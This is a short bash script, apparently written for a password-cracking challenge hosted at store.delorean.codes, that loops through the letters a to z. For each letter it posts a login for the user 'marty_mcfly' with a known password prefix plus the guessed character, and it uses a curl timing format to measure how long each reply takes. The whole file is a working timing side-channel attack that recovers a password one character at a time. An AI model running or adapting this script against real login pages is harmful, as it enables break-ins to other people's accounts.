#!/bin/bash

for i in {a..z}
do
    curl --data "username=marty_mcfly&password=hfmdZiCWag${i}" -w "@curl-format.txt" -so /dev/null https://store.delorean.codes/u/EoinDavey/login
    echo ": $i"
done
